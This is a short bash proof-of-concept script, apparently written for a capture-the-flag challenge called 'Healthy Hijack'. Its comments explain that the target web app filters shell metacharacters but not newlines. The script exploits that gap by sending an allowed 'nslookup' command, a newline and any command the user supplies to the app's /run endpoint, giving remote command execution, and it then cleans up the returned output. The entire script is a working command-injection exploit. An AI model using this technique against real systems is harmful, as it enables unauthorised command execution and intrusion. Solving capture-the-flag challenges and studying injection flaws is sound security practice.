#!/usr/bin/env bash
# Healthy Hijack - 1  |  RCE helper
# The app whitelists commands by prefix (ping|traceroute|nslookup) and strips
# ; & | ` $( and < but NOT the newline character (\\n). Because the command is
# executed with shell=True, a newline lets us run ANY second command as appuser.
#
# Usage:  ./poc_rce.sh 'id'
set -u
TARGET="https://kicyber-09f8ad8ee6f2-healthyhijack-0-0.chals.io"

rexec() {
    local c="$1"
    # prefix with an allowed command, then inject our payload on a new line
    curl -sk --max-time 60 -X POST "$TARGET/run" \
        --data-urlencode "cmd=nslookup localhost
$c" \
    | sed -n '/#0f0/,/<\/div>/p' \
    | sed 's/<[^>]*>//g' \
    | sed '1,/::1/d'
}

rexec "$1"